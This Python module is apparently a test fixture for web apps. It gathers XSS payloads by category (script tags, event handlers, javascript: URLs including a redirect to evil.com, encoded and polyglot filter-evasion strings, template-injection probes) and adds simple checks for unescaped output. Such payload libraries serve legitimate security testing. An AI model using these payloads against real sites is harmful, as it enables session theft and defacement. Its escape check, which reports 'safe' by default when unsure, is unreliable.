"""
XSS (Cross-Site Scripting) Payload Library

Comprehensive collection of XSS attack vectors for security testing.
Tests both reflected and stored XSS vulnerabilities.
"""

from typing import List, Dict


class XSSPayloads:
    """Library of XSS attack vectors"""

    # Basic XSS payloads
    BASIC = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
    ]

    # Event handler-based XSS
    EVENT_HANDLERS = [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
    ]

    # HTML injection
    HTML_INJECTION = [
        "<h1>Injected Heading</h1>",
        "<div>Injected Content</div>",
        "<style>body{display:none}</style>",
        "<iframe src='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<object data='javascript:alert(1)'>",
    ]

    # JavaScript protocol
    JAVASCRIPT_PROTOCOL = [
        "javascript:alert('XSS')",
        "javascript:alert(1)",
        "javascript:void(0)",
        "javascript:document.location='http://evil.com'",
    ]

    # Encoded payloads
    ENCODED = [
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entities
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoding
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # Hex encoding
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",  # Filter evasion
    ]

    # Context-specific XSS
    ATTRIBUTE_INJECTION = [
        "' onclick='alert(1)",
        '" onclick="alert(1)',
        "' onmouseover='alert(1)",
        '" onmouseover="alert(1)',
        "' autofocus onfocus='alert(1)",
    ]

    # Polyglot XSS (works in multiple contexts)
    POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>/\\x3e",
        "'>><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(document.cookie)</script>\" ><img/id=\"confirm( 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">",
    ]

    # DOM-based XSS
    DOM_BASED = [
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",  # alert(1) base64
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",  # alert(1) charcode
        "<script>location.hash.slice(1)</script>#<img src=x onerror=alert(1)>",
    ]

    # Template injection (if templates used)
    TEMPLATE_INJECTION = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "*{7*7}",
        "@{7*7}",
    ]

    @classmethod
    def get_all_payloads(cls) -> List[str]:
        """Get all XSS payloads"""
        all_payloads = []
        all_payloads.extend(cls.BASIC)
        all_payloads.extend(cls.EVENT_HANDLERS)
        all_payloads.extend(cls.HTML_INJECTION)
        all_payloads.extend(cls.JAVASCRIPT_PROTOCOL)
        all_payloads.extend(cls.ENCODED)
        all_payloads.extend(cls.ATTRIBUTE_INJECTION)
        return all_payloads

    @classmethod
    def get_basic_payloads(cls) -> List[str]:
        """Get basic/essential XSS payloads for quick testing"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "' onclick='alert(1)",
            "javascript:alert(1)",
        ]

    @classmethod
    def get_payloads_by_category(cls, category: str) -> List[str]:
        """Get payloads by category"""
        categories = {
            "basic": cls.BASIC,
            "event": cls.EVENT_HANDLERS,
            "html": cls.HTML_INJECTION,
            "javascript": cls.JAVASCRIPT_PROTOCOL,
            "encoded": cls.ENCODED,
            "attribute": cls.ATTRIBUTE_INJECTION,
            "dom": cls.DOM_BASED,
            "template": cls.TEMPLATE_INJECTION,
        }
        return categories.get(category.lower(), [])


# Expected secure behavior markers
SECURE_XSS_RESPONSES = {
    # Payload should be escaped/encoded in output
    "escaped_indicators": [
        "&lt;script&gt;",  # < and > encoded
        "&#60;script&#62;",  # HTML entities
        "&amp;lt;script&amp;gt;",  # Double encoding
    ],
    # Should NOT contain these (indicates vulnerability)
    "vulnerable_indicators": [
        "<script>",
        "onerror=",
        "onload=",
        "onclick=",
        "javascript:",
    ],
}


def is_xss_vulnerable(html_content: str, payload: str) -> bool:
    """
    Check if HTML content contains unescaped XSS payload

    Args:
        html_content: Rendered HTML content
        payload: Original XSS payload

    Returns:
        True if payload is unescaped (vulnerable), False if properly escaped
    """
    html_lower = html_content.lower()

    # Check if dangerous tags/attributes are present unescaped
    for indicator in SECURE_XSS_RESPONSES["vulnerable_indicators"]:
        if indicator in html_lower:
            # Payload might be reflected unescaped
            return True

    # Check for javascript: protocol
    if "javascript:" in html_lower:
        return True

    # Check for event handlers (onclick, onload, etc.)
    event_handlers = ["onclick=", "onload=", "onerror=", "onmouseover=", "onfocus="]
    for handler in event_handlers:
        if handler in html_lower:
            return True

    return False


def check_xss_escaped(html_content: str, original_payload: str) -> bool:
    """
    Verify that XSS payload was properly escaped in HTML

    Args:
        html_content: Rendered HTML content
        original_payload: Original XSS payload

    Returns:
        True if payload is properly escaped, False if vulnerable
    """
    # Check for proper HTML entity encoding
    for escaped in SECURE_XSS_RESPONSES["escaped_indicators"]:
        if escaped in html_content:
            # Payload appears to be escaped
            return True

    # If payload contains <script> or similar, it should be encoded
    if "<" in original_payload or ">" in original_payload:
        # Check that these are encoded
        if "&lt;" in html_content or "&#60;" in html_content:
            return True
        # If not encoded and original payload present, it's vulnerable
        if original_payload in html_content:
            return False

    # If we can't determine, assume safe (conservative)
    return True
